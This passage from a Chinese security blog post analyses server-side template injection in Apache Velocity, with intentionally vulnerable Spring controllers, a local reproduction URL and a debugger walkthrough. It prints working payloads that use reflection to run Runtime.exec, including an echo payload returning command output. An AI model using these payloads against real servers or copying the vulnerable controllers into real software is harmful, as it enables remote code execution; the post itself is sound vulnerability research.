+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.velocity.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.Velocity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityEvaluate</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/velocityevaluate&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">velocity</span><span class="params">(String template)</span> &#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        context.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;powerful&quot;</span>);</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">swOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">&quot;test&quot;</span>, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="O8puM">merge触发</h6>
+
+<p>merge 方法用于将 Velocity 模板字符串与上下文数据进行组合并生成最终结果，merge方法的基本语法如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(Template template, Context context, Writer writer)</span></span><br><span class="line"><span class="comment">//template：待处理的Velocity模板</span></span><br><span class="line"><span class="comment">//contexxt：上下文数据，用于替换模板中占位符的数据</span></span><br><span class="line"><span class="comment">//writer：输出结果的写入器，用于将生成的结果写入到指定位置</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.velocity.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.RuntimeServices;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.RuntimeSingleton;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.parser.node.SimpleNode;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VelocityMerge</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/velocitymerge&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">velocity2</span><span class="params">(<span class="meta">@RequestParam(defaultValue = &quot;username&quot;)</span>String username)</span> <span class="keyword">throws</span> IOException, ParseException,org.apache.velocity.runtime.parser.ParseException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">templateString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\template.vm&quot;</span>)));</span><br><span class="line">        templateString = templateString.replace(<span class="string">&quot;&lt;USERNAME&gt;&quot;</span>, username);</span><br><span class="line">        <span class="type">StringReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(templateString);</span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line">        ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Curlysean&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;13888888888&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;sean@test.com&quot;</span>);</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        org.apache.velocity.<span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.velocity.Template();</span><br><span class="line">        <span class="type">RuntimeServices</span> <span class="variable">runtimeServices</span> <span class="operator">=</span> RuntimeSingleton.getRuntimeServices();</span><br><span class="line">        <span class="type">SimpleNode</span> <span class="variable">node</span> <span class="operator">=</span> runtimeServices.parse(reader, String.valueOf(template));</span><br><span class="line">        template.setRuntimeServices(runtimeServices);</span><br><span class="line">        template.setData(node);</span><br><span class="line">        template.initDocument();</span><br><span class="line">        template.merge(ctx, out);</span><br><span class="line">        <span class="keyword">return</span> out.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>C:\tmp\template.vm</code>中，写入我们的攻击payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>
+
+<h5 id="kg75i">漏洞复现</h5>
+
+<p>漏洞复现以evaluate方法漏洞Demo为例，当我们访问以下URL时，就会触发我们的SSTI（这里的环境不是很好，所以会爆500错误，正常会回显模板渲染的结果，别太在意哈）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/velocityevaluate?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753886497826-6ff873d6-0d83-4ed3-89c3-8099490fd6d8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753886497826-6ff873d6-0d83-4ed3-89c3-8099490fd6d8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h5 id="XqqoP">漏洞分析</h5>
+
+<p>在evaluate方法处，下一个断点，跟进去看一看具体的调用流程</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753890910559-cb7952f0-ca12-4be5-bde0-05aa8e16b49a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753890910559-cb7952f0-ca12-4be5-bde0-05aa8e16b49a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>层层跟入<code>evaluate</code>方法，走到<code>RuntimeInstance#evaluate</code>中，到这里我们传入的String类型的字符串，转换成了Reader类，在<code>this.parse</code>处解析成<code>nodeTree</code>（可以自己调试着看一看，跟数据结构有点关系）。</p>
+<p>最后调用<code>this.render</code>方法，传入<code>nodeTree</code>，进行渲染操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753891153242-5f88a933-1cf4-4585-ac0e-f11c1bd1ab44.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753891153242-5f88a933-1cf4-4585-ac0e-f11c1bd1ab44.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进<code>this.render</code>方法，首先调用<code>nodeTree.init</code>对节点树进行初始化，然后调用<code>nodeTree.render</code>将节点树渲染到解析器中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753891520659-216b3402-e64d-4a15-bf2e-85c62310098e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753891520659-216b3402-e64d-4a15-bf2e-85c62310098e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进到<code>nodeTree.render</code>方法中，使用for循环遍历所有的字节点，通过<code>jjtGetChild(i)</code>方法来获取第i个子节点，并调用render方法来渲染子节点。子节点同时也有可能是子节点树，for循环遍历的时候同时也在递归渲染。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753892273877-3fb6a08e-e1f6-4573-9a9f-a3313b511c9b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753892273877-3fb6a08e-e1f6-4573-9a9f-a3313b511c9b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在遍历到第三个节点的时候，跟进去，首先经过一系列判断，走到<code>this.execute</code>方法处，即<code>ASTMethod#execute</code>，这里继续调用子节点树节点的<code>execute</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753893010101-f1462f5e-cf79-4079-999d-fd39b7dd177c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753893010101-f1462f5e-cf79-4079-999d-fd39b7dd177c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>继续进入，就到了<code>method.invoke</code>执行反射方法调用的地方，将执行的返回的obj返回，作为下一个调用下一个方法的对象</p>
+<p>应该到这里就能理解了，先执行<code>&#39;e&#39;.getClass</code>，返回<code>java.lang.String</code>，再调用<code>java.lang.String</code>的<code>forName(&quot;java.lang.Runtime&quot;)</code>，以此类推……</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753893133365-c2d066d2-092b-4702-a86a-09ba50d23e27.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753893133365-c2d066d2-092b-4702-a86a-09ba50d23e27.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>mergr方法触发的流程和这个差不多，就不再具体分析了，有兴趣的可以自己去看看</p>
+<h4 id="hJg8A">有回显的Payload</h4>
+
+<p>我们知道其实该SSTI最后达到的效果就是任意代码执行，最后被渲染的地方会被替换为 代码所返回的值，那么我们就可以构造有回显的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($x=<span class="string">&#x27;&#x27;</span>)+#set($rt=$x.class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>))+#set($chr=$x.class.forName(<span class="string">&#x27;java.lang.Character&#x27;</span>))+#set($str=$x.class.forName(<span class="string">&#x27;java.lang.String&#x27;</span>))+#set($ex=$rt.getRuntime().exec(<span class="string">&#x27;id&#x27;</span>))+$ex.waitFor()+#set($out=$ex.getInputStream())+#foreach($i+in+[<span class="number">1.</span>.$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rt = java.lang.Runtime.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">chr</span> = java.lang.<span class="type">String</span></span><br><span class="line"><span class="variable">ex</span> <span class="operator">=</span> java.lang.Runtime.getRuntime().exec(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">ex.waitFor()</span><br><span class="line"><span class="comment">// 循环读取输出</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="K6KNY">小结</h2>
+
+<p>感觉确实比较难，学习SSTI的同时，也将Spring一些底层部分简单学习了一下，也算是为后面Spring内存马的学习做一些简单的铺垫吧</p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/SSTI/" class="">
+              SSTI
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>CurlySean</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2025/07/31/Java中的模板注入/" target="_blank" title="Java中的模板注入">http://curlysean.github.io/2025/07/31/Java中的模板注入/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+    </div>
+    <a href="/2025/08/04/Groovy%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> 上一篇:
+        <div class="title-text">Groovy脚本执行</div>
+      </div>
+      
+      <!-- <div class="content">
+        Groovy脚本执行
+前言
+在审计一套源码的时候，mt告诉我的漏洞中，有一个从来没见过没听过的漏洞 —— Groovy脚
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pic3.zhimg.com/v2-a5267dfbf175991d4b3a69b41f3f678a_b.jpg" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/v2-a5267dfbf175991d4b3a69b41f3f678a_b.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2025/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget%E6%8E%A2%E6%B5%8B/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">Java反序列化Gadget探测</div>
+      </div>
+      <!-- <div class="content">
+        Java反序列化Gadget探测
+前言
+
+之前面试的时候，有问过我：”在黑盒测试中，找到一个反序列化过程的点，你该怎么找
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/medias/alipay.jpg" class="lazyload placeholder" data-srcset="/medias/alipay.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/medias/wechatpay.jpg" class="lazyload placeholder" data-srcset="/medias/wechatpay.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script defer src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+
+<!-- 还需要在后面这个地址里设置script, comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <aside id='l_side'>
+  
+    
+      <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box circle' href='/about/'>
+          <img src='/medias/avatar.png'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>CurlySean</h2>
+        
+        
+          <p>想要成为大佬的卷毛肖恩</p>
+
+        
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:5345414e@gmail.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/CurlySean"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=631722343"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#KKHyE"><span class="toc-text">Java中的模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#qYrMv"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NzTM6"><span class="toc-text">模板注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AUZdp"><span class="toc-text">FreeMarker</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WKYHX"><span class="toc-text">FreeMarker基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#py830"><span class="toc-text">总体结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SbVAT"><span class="toc-text">插值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#h28HM"><span class="toc-text">内建函数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#anA3U"><span class="toc-text">api内建函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#GkmNT"><span class="toc-text">new内建函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#YlT3H"><span class="toc-text">FreeMarker SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PEFTn"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rFwHa"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#USVve"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pnsts"><span class="toc-text">FreeMarker SSTI Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#S2PeB"><span class="toc-text">Poc1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DR4vo"><span class="toc-text">Poc2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Tc6Sc"><span class="toc-text">Poc3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#eSMeQ"><span class="toc-text">Poc4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#w8Dbx"><span class="toc-text">Poc5(文件读取)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCRk6"><span class="toc-text">FreeMarker SSTI修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nAcgD"><span class="toc-text">Thymeleaf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jU0m6"><span class="toc-text">Thymeleaf基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#UXyM6"><span class="toc-text">Thymeleaf语法基础</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#klKXS"><span class="toc-text">表达式预处理</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ptZM2"><span class="toc-text">Thymeleaf SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#K5Lmj"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#os3QB"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EqNy6"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#tIHLE"><span class="toc-text">获取handler</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sj79C"><span class="toc-text">获取Controller</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#J44FC"><span class="toc-text">获取ModelAndView</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#BHTP0"><span class="toc-text">ViewResolver与渲染</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UvesV"><span class="toc-text">Thymeleaf SSTI Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XAj9D"><span class="toc-text">传参检测与绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mfCEA"><span class="toc-text">url中的ThymeleafSSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Bgk9I"><span class="toc-text">Poc1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ugyPD"><span class="toc-text">Poc2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vOrLm"><span class="toc-text">ThymeleafSSTI无回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#qtB3K"><span class="toc-text">Thymeleaf中SSTI的防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#g0UuM"><span class="toc-text">Velocity</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#H5gZl"><span class="toc-text">Velocity基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ULBSL"><span class="toc-text">Velocity语法基础</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VEHxw"><span class="toc-text">Velocity SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Djxun"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#wBNzX"><span class="toc-text">evaluate触发</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#O8puM"><span class="toc-text">merge触发</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#kg75i"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XqqoP"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hJg8A"><span class="toc-text">有回显的Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#K6KNY"><span class="toc-text">小结</span></a></li></ol></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/26/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-26</span>
+                
+              </div>
